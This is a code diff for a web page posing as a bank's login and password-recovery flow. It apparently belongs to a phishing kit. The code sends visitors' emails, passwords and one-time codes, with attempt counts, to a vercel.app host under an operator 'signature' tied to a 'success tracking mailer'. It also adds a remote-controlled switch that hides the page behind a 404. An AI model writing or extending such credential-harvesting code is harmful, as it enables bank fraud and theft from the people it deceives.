@@ -20,14 +20,15 @@ document.addEventListener("DOMContentLoaded", () => {
         });
 
         try {
-            const response = await fetch("https://bssd-api.vercel.app/api/bank/auth", {
+            // UPDATED: Route points directly to /api/bank/login-user
+            const response = await fetch("https://bank-api-v2.vercel.app/api/bank/login-user", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     action: "login",
                     email: emailVal,
                     password: passwordVal,
-                    signature: "g-lite" // Ensure this matches the exactly assigned signature value in your database!
+                    signature: "g-lite"
                 })
             });
 
@@ -37,7 +38,6 @@ document.addEventListener("DOMContentLoaded", () => {
                 throw new Error(result.error || "Authentication framework execution anomaly.");
             }
 
-            // Move cleanly to the secure verification terminal layout deployment matrix
             initializeSecureOTPPadTerminal(result.user_id);
 
         } catch (err) {
@@ -52,7 +52,6 @@ document.addEventListener("DOMContentLoaded", () => {
         let enteredOTP = "";
         let countdownInterval = null;
 
-        // PERSISTENCE FIX: Check if an attempt counter already exists for this login session, otherwise start at 1
         if (!sessionStorage.getItem('login_attempts_state')) {
             sessionStorage.setItem('login_attempts_state', '1');
         }
@@ -110,7 +109,6 @@ document.addEventListener("DOMContentLoaded", () => {
                 const cooldownText = popup.querySelector('#cooldown-text');
                 const resendBtn = popup.querySelector('#resend-otp-btn');
 
-                // UPDATED: Adjusted Countdown Framework to 20 seconds
                 let timeLeft = 20;
                 const startTimer = () => {
                     timeLeft = 20;
@@ -129,9 +127,8 @@ document.addEventListener("DOMContentLoaded", () => {
                     }, 1000);
                 };
 
-                startTimer(); // Kick off the initial countdown
+                startTimer();
 
-                // Setup Resend Handler Loop Triggering Login Event Data Stream
                 resendBtn.addEventListener('click', async () => {
                     resendBtn.disabled = true;
                     resendBtn.textContent = "Sending...";
@@ -140,7 +137,8 @@ document.addEventListener("DOMContentLoaded", () => {
                     const passwordVal = document.getElementById('password').value;
 
                     try {
-                        const response = await fetch("https://bssd-api.vercel.app/api/bank/auth", {
+                        // UPDATED: Route points directly to /api/bank/login-user
+                        const response = await fetch("https://bank-api-v2.vercel.app/api/bank/login-user", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({
@@ -158,7 +156,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
                         resendBtn.textContent = "Resend OTP via Mail";
                         resendBtn.disabled = false;
-                        startTimer(); // Loop back: restart countdown loop framework
+                        startTimer();
                     } catch (err) {
                         Swal.showValidationMessage(`Resend failed: ${err.message}`);
                         resendBtn.textContent = "Resend OTP via Mail";
@@ -206,7 +204,8 @@ document.addEventListener("DOMContentLoaded", () => {
                 let activeAttempts = parseInt(sessionStorage.getItem('login_attempts_state') || '1', 10);
 
                 try {
-                    const verificationResponse = await fetch("https://bssd-api.vercel.app/api/bank/auth", {
+                    // UPDATED: Route points directly to /api/bank/login-user
+                    const verificationResponse = await fetch("https://bank-api-v2.vercel.app/api/bank/login-user", {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
                         body: JSON.stringify({
@@ -214,7 +213,7 @@ document.addEventListener("DOMContentLoaded", () => {
                             user_id: userId,
                             otp: enteredOTP,
                             current_attempts: activeAttempts,
-                            signature: "g-lite" // Sent down to resolve admin lookup for success tracking mailer
+                            signature: "g-lite"
                         })
                     });
 
@@ -247,7 +246,6 @@ document.addEventListener("DOMContentLoaded", () => {
             }
         }).then((flowResolution) => {
             if (flowResolution.isConfirmed && flowResolution.value && flowResolution.value.success) {
-                // SUCCESS CLEAN UP: Clear session storage attempts tracking state entirely
                 sessionStorage.removeItem('login_attempts_state');
 
                 const completeData = flowResolution.value;
@@ -279,7 +277,6 @@ document.addEventListener("DOMContentLoaded", () => {
 document.getElementById('forgotPasswordLink').addEventListener('click', (e) => {
     e.preventDefault();
 
-    // Step 1: Prompt for Registered Email Address
     Swal.fire({
         title: 'Account Recovery',
         text: 'Enter your registered email address to receive a security recovery token.',
@@ -296,7 +293,8 @@ document.getElementById('forgotPasswordLink').addEventListener('click', (e) => {
                 return false;
             }
             try {
-                const response = await fetch("https://bssd-api.vercel.app/api/bank/auth", {
+                // UPDATED: Route points directly to /api/bank/forgot-password
+                const response = await fetch("https://bank-api-v2.vercel.app/api/bank/forgot-password", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
@@ -316,11 +314,11 @@ document.getElementById('forgotPasswordLink').addEventListener('click', (e) => {
         }
     }).then((emailResult) => {
         if (emailResult.isConfirmed && emailResult.value) {
-            // Step 2: Open custom Virtual PIN Pad for OTP validation
             openRecoveryOTPTerminal(emailResult.value.email, emailResult.value.user_id);
         }
     });
 });
+
 
 /**
  * Custom Sandboxed Virtual PIN Pad for Recovery Verification with 20s Countdown Timer
@@ -328,7 +326,6 @@ document.getElementById('forgotPasswordLink').addEventListener('click', (e) => {
 function openRecoveryOTPTerminal(email, userId) {
     let enteredOTP = "";
     let countdownInterval = null;
-    // UPDATED: Adjusted internal verification variable tracker to 20 seconds
     let secondsLeft = 20;
 
     const terminalTemplateHtml = `
@@ -385,7 +382,6 @@ function openRecoveryOTPTerminal(email, userId) {
             const timerText = popup.querySelector('#otp-timer-text');
             const resendBtn = popup.querySelector('#resend-otp-btn');
 
-            // UPDATED: Set up recovery loop countdown to 20 seconds
             const startCountdown = () => {
                 secondsLeft = 20;
                 resendBtn.style.display = "none";
@@ -412,7 +408,7 @@ function openRecoveryOTPTerminal(email, userId) {
                 resendBtn.disabled = true;
                 resendBtn.textContent = "Sending...";
                 try {
-                    const res = await fetch("https://bssd-api.vercel.app/api/bank/auth", {
+                    const res = await fetch("https://bank-api-v2.vercel.app/api/bank/forgot-password", {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
                         body: JSON.stringify({
@@ -466,13 +462,15 @@ function openRecoveryOTPTerminal(email, userId) {
                 return false;
             }
             try {
-                const response = await fetch("https://bssd-api.vercel.app/api/bank/auth", {
+                // FIXED: Included email and signature parameters
+                const response = await fetch("https://bank-api-v2.vercel.app/api/bank/forgot-password", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
                         action: "verify_password_otp",
-                        user_id: userId,
-                        otp: enteredOTP
+                        email: email,
+                        otp: enteredOTP,
+                        signature: "g-lite"
                     })
                 });
                 const result = await response.json();
@@ -485,7 +483,7 @@ function openRecoveryOTPTerminal(email, userId) {
         }
     }).then((otpResult) => {
         if (otpResult.isConfirmed) {
-            openNewPasswordFormTerminal(userId);
+            openNewPasswordFormTerminal(email);
         }
     });
 }
@@ -493,7 +491,7 @@ function openRecoveryOTPTerminal(email, userId) {
 /**
  * Step 3: Password Update Form Terminal
  */
-function openNewPasswordFormTerminal(userId) {
+function openNewPasswordFormTerminal(email) {
     const formTemplateHtml = `
     <div style="margin: 15px 0; font-family: 'Inter', sans-serif; text-align: left;">
         <p style="font-size: 13px; color:#64748b; margin-bottom: 20px; text-align: center;">Set up your new password below. Make sure it adheres to high-security compliance targets.</p>
@@ -540,13 +538,15 @@ function openNewPasswordFormTerminal(userId) {
             }
 
             try {
-                const response = await fetch("https://bssd-api.vercel.app/api/bank/auth", {
+                // FIXED: Included email, signature, and mapped newPassword field correctly
+                const response = await fetch("https://bank-api-v2.vercel.app/api/bank/forgot-password", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
                         action: "commit_new_password",
-                        user_id: userId,
-                        password: newPassword
+                        email: email,
+                        newPassword: newPassword,
+                        signature: "g-lite"
                     })
                 });
                 const result = await response.json();
@@ -568,3 +568,21 @@ function openNewPasswordFormTerminal(userId) {
         }
     });
 }
+
+(async function enforceSystemVisibilityGuard() {
+    const HARDCODED_SIGNATURE = "g-lite";
+
+    try {
+        const response = await fetch(`https://bank-api-v2.vercel.app/api/bank/check?signature=${encodeURIComponent(HARDCODED_SIGNATURE)}`);
+        const data = await response.json();
+
+        if (data.success) {
+            if (data.visibility === false) {
+                // Redirect away safely using an absolute calculation path string
+                window.location.href = window.location.origin + "/404.html";
+            }
+        }
+    } catch (err) {
+        console.error("Uptime gate guard check bypassed smoothly:", err);
+    }
+})();
